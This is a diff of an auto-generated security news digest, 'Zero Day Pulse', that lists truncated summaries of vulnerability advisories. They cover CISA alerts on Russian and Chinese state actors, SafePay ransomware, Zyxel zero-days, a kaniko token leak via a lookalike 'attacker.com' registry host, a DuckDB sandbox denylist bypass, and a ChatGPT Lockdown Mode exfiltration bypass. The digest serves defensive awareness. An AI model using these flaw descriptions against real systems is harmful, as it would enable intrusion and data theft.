@@ -1,15 +1,15 @@
 # Zero Day Pulse
 
-> **Generated:** 2026-11-05 13:38 UTC &nbsp;|&nbsp; **Total:** 14 &nbsp;|&nbsp; 🔴 KEV: 0 &nbsp;|&nbsp; 🟠 Zero-Day: 10 &nbsp;|&nbsp; 🟡 High: 4 &nbsp;|&nbsp; ✨ Enriched: 0
+> **Generated:** 2026-11-05 22:58 UTC &nbsp;|&nbsp; **Total:** 14 &nbsp;|&nbsp; 🔴 KEV: 0 &nbsp;|&nbsp; 🟠 Zero-Day: 10 &nbsp;|&nbsp; 🟡 High: 4 &nbsp;|&nbsp; ✨ Enriched: 0
 
 ---
 
-## 1. 🟠 Zero-Day — SonicWall warns of unpatched flaws in end-of-life GMS software
+## 1. 🟠 Zero-Day — Improve Router Hygiene to Protect Against Russian State-Sponsored Targeting
 
-**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Bleeping Computer &nbsp;|&nbsp; **Published:** 2026-11-04
-**Reference:** <https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-unpatched-flaws-in-end-of-life-gms-software/>
+**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** CISA US-CERT Alerts &nbsp;|&nbsp; **Published:** Wed, 08 Ju
+**Reference:** <https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-194a>
 
-> SonicWall warned customers of two security flaws affecting end-of-life Global Management System (GMS) systems that will not be patched. [...]
+> Russian Government-Sponsored Activity Targets Poorly Configured and Vulnerable Devices Across Critical Sectors Executive summary Russian Federal Security Service (FSB) Center 16 cyber actors continue to exploit poorly configured and vulnerable networking devices worldwide, opportunistically compromising multiple critical infrastructure sector networks. This joint Cybersecurity Advisory (CSA) build…
 
 ---
 
@@ -58,7 +58,29 @@
 
 ---
 
-## 7. 🟠 Zero-Day — Zyxel Switch Hacks Blamed on Patched Flaw Actually Exploited a Zero-Day
+## 7. 🟠 Zero-Day — Russian State-Supported Cyber Actors Conduct Phishing Campaign Targeting Users of Zimbra Collaboration Suite
+
+**CVE:** `CVE-2025-66376` &nbsp;|&nbsp; **Source:** CISA US-CERT Alerts &nbsp;|&nbsp; **Published:** Tue, 21 Ju
+**Reference:** <https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-204a>
+
+> Russian State-Supported Cyber Actors Conduct Phishing Campaign Targeting Users of Zimbra Collaboration Suite Executive summary A group of Russian state-supported cyber actors has been targeting and compromising various Western government and commercial organizations using the Zimbra Collaboration Suite (ZCS) software since at least July 2025. The Russian state-supported advanced persistent threat …
+
+---
+
+## 8. 🟠 Zero-Day — Researchers Bypass ChatGPT Lockdown Mode to Exfiltrate Chats Without User Interaction
+
+**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** The Hacker News Security &nbsp;|&nbsp; **Published:** 2026-11-05
+**Reference:** <https://thehackernews.com/2026/11/researchers-bypass-chatgpt-lockdown.html>
+
+> Cybersecurity researchers have disclosed details of a now-patched vulnerability that could be exploited to bypass Lockdown Mode protections in OpenAI ChatGPT.
+
+Lockdown Mode was introduced by the artificial intelligence (AI) company in June 2026 as an optional setting to minimize data exfiltration risks arising from prompt injections.
+
+&quot;The flaw could enable silent chat data theft, phishing,
+
+---
+
+## 9. 🟠 Zero-Day — Zyxel Switch Hacks Blamed on Patched Flaw Actually Exploited a Zero-Day
 
 **CVE:** `CVE-2026-107441` &nbsp;|&nbsp; **Source:** SecurityWeek &nbsp;|&nbsp; **Published:** 2026-11-05
 **Reference:** <https://www.securityweek.com/zyxel-switch-hacks-blamed-on-patched-flaw-actually-exploited-a-zero-day/>
@@ -67,7 +89,7 @@
 
 ---
 
-## 8. 🟠 Zero-Day — Zyxel GS1900 Patch Fails to Block Zero-Day Exploit Allowing Root Command Execution
+## 10. 🟠 Zero-Day — Zyxel GS1900 Patch Fails to Block Zero-Day Exploit Allowing Root Command Execution
 
 **CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** The Hacker News Security &nbsp;|&nbsp; **Published:** 2026-11-05
 **Reference:** <https://thehackernews.com/2026/11/zyxel-gs1900-patch-fails-to-block-zero.html>
@@ -80,61 +102,34 @@ The earlier fix is the 2…
 
 ---
 
-## 9. 🟠 Zero-Day — Zyxel fixes zero-day exploited to hack nearly 1,000 network switches
+## 11. 🟡 High Severity — Chinese Government-linked Cyber Threat Actors Combine Automated and Hands-on Hacking Tools to Steal Sensitive Data
 
-**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Bleeping Computer &nbsp;|&nbsp; **Published:** 2026-11-04
-**Reference:** <https://www.bleepingcomputer.com/news/security/zyxel-fixes-zero-day-exploited-to-hack-nearly-1-000-network-switches/>
+**CVE:** `CVE-2014-6278` | `CVE-2015-3306` | `CVE-2015-5477` | `CVE-2016-3081` | `CVE-2019-11510` | `CVE-2021-22205` | `CVE-2021-3199` | `CVE-2023-22894` &nbsp;|&nbsp; **Source:** CISA US-CERT Alerts &nbsp;|&nbsp; **Published:** Tue, 06 Oc
+**Reference:** <https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-281a>
 
-> Zyxel has patched a zero-day vulnerability in its GS1900 series network switches that hackers exploited to compromise nearly 1,000 devices worldwide and steal configuration files and credentials. [...]
-
----
-
-## 10. 🟠 Zero-Day — Researchers Uncover Prompt Adware Hidden in OpenAI Codex Jailbreak Toolkit
-
-**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** The Hacker News Security &nbsp;|&nbsp; **Published:** 2026-11-04
-**Reference:** <https://thehackernews.com/2026/11/researchers-uncover-prompt-adware.html>
-
-> Cybersecurity researchers have disclosed details of an OpenAI Codex jailbreak bundle that&#x27;s designed to modify an artificial intelligence (AI) agent&#x27;s trusted instructions to insert advertisements for a third-party AI gateway.
-
-The phenomenon has been codenamed prompt adware by Check Point Research.
-
-Called Haiou (meaning Seagull in Chinese), the jailbreak modifies OpenAI Codex&#x27;s co…
+> Advisory at a Glance Title Chinese Government-linked Cyber Threat Actors Combine Automated and Hands-on Hacking Tools to Steal Sensitive Data Original Publication October 8, 2026 Executive Summary Chinese government-linked cyber threat actors, enabled by the Integrity Technology Group, are combining automated scanning tools, large-scale botnets, and hands-on exploitation techniques to target and s…
 
 ---
 
-## 11. 🟡 High Severity — Arc: DuckDB I/O aliases bypass database RBAC after CVE-2026-47735
+## 12. 🟡 High Severity — #StopRansomware: SafePay Ransomware
 
-**CVE:** `CVE-2026-55098` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-11-04
-**Reference:** <https://github.com/advisories/GHSA-93cm-2v4m-c56c>
+**CVE:** `CVE-2020-3259` | `CVE-2023-20269` | `CVE-2023-27532` | `CVE-2024-40711` | `CVE-2024-40766` &nbsp;|&nbsp; **Source:** CISA US-CERT Alerts &nbsp;|&nbsp; **Published:** Mon, 19 Oc
+**Reference:** <https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-293a>
+
+> Advisory at a Glance Title #StopRansomware: SafePay Ransomware Original Publication October 20, 2026 Executive Summary This advisory details recent activity by the SafePay ransomware group. SafePay actors have been highly active since August 2024, targeting businesses and critical infrastructure across North America, South America, Europe, and Australia. SafePay actors typically gain access to net…
+
+---
+
+## 13. 🟡 High Severity — kaniko can send the build's Azure (Entra ID) access token to lookalike ACR registry hosts
+
+**CVE:** `CVE-2026-105769` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-11-05
+**Reference:** <https://github.com/advisories/GHSA-5q7h-w9jf-cx97>
 
 > ### Summary
 
-The fix for CVE-2026-47735 (released 2026.06.1) is incomplete. It added a DuckDB sandbox (`SET GLOBAL allowed_directories=[&lt;storage root&gt;]; SET GLOBAL enable_external_access=false`) and an Arc SQL-layer denylist of the **literal** functions `read_parquet(` and `arc_partition_agg(`. The sandbox correctly blocks reads **outside** the storage root (OS files, `http://` SSRF), but it…
+kaniko before v1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to a registry host an attacker controls. A Dockerfile that references an image on a lookalike host, such as `FROM x.azurecr.io.attacker.com/img`, is enough. The build needs no `RUN` instruction and never has to push.
 
----
-
-## 12. 🟡 High Severity — SonicWall Won't Patch EoL GMS Flaws That Could Expose Files, Alter Database Records
-
-**CVE:** `CVE-2026-109593` &nbsp;|&nbsp; **Source:** The Hacker News Security &nbsp;|&nbsp; **Published:** 2026-11-04
-**Reference:** <https://thehackernews.com/2026/11/sonicwall-wont-patch-eol-gms-flaws-that.html>
-
-> SonicWall has warned of two vulnerabilities impacting end-of-life Global Management System (GMS) systems that it said will not be patched.
-
-Details of the security flaws, which affect SonicWall GMS 9.5.2 and earlier versions, are below -
-
-
-  CVE-2026-109593 (CVSS score: 9.1) - An unauthenticated file read vulnerability that could allow an attacker with network access to read internal GMS files,
-
----
-
-## 13. 🟡 High Severity — odf-kit: HTML injection leading to XSS in odtToHtml() and odsToHtml() via unescaped style attribute values
-
-**CVE:** `CVE-2026-113787` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-11-04
-**Reference:** <https://github.com/advisories/GHSA-3cgg-c5pp-57h6>
-
-> ### Summary
-
-ODF style attribute values are interpolated into `style=&quot;...&quot;` attributes without HTML-escaping in **both** of odf-kit&#x27;s to-HTML renderers (`odtToHtml` and `odsToHtml`). A double-quote character inside an attacker-controlled style value breaks out of the attribute, allowing arbitrary HTML/attribute injection — and therefore script execution (XSS) — from a crafted `.odt`…
+The flaw is in the Azure Container Registry (ACR) credential help…
 
 ---
 
